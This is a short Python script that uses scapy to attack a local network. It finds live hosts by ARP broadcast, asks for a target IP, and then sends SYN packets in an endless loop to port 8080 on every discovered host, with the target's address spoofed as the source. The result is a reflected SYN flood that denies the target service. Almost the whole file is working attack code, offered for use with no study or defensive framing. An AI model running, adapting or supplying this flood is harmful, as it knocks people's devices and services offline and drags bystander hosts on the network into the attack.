print('LOADING: program getting ready to attack...')


import scapy.all as scapy
import os,re, sys
def getIps(hackerip):
    ipl = hackerip.split('.')
    ips = []
    # print(f'ipl[0]}.{ipl[1]}.{ipl[2]}.1/24')
    arpRequest = scapy.ARP(pdst=f'{ipl[0]}.{ipl[1]}.{ipl[2]}.1/24')
    brodcustEther = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = brodcustEther / arpRequest

    result = scapy.srp(packet, timeout = 3, verbose = 0)[0]
    for sent, received  in result:
        ips.append(received.psrc)

    return ips


def synPacket(tragetIp, tragetPort, networkIp):
        ip = scapy.IP(dst=networkIp, src = tragetIp)

        tcp = scapy.TCP(sport=scapy.RandShort(), dport= tragetPort, flags='S')


        raw = scapy.Raw(b"x"*1024)
        packet = ip / tcp / raw

        scapy.send(packet, loop=0, verbose =0)







addresses = os.popen('IPCONFIG | FINDSTR /R "Wireless LAN adapter WiFi .* Address.*[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*"')
ip = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', addresses.read()).group()


#starting the Attck
ips = getIps(ip)
ips.remove(ips[0])
targetip = input('Enter Target IP: ')

if targetip in ips:
    print('Ip found \n Starting Attack')
if targetip not in ips:
    
    print('The ip is not online enter  another one')
    sys.exit()

# print(f'target Ip: {targetip}')

# print(f'hacker Ip: {ip}')

# print(f'ip List: {ips}')

while True:
    for i in range(len(ips)):
        synPacket(targetip,8080, ips[i])

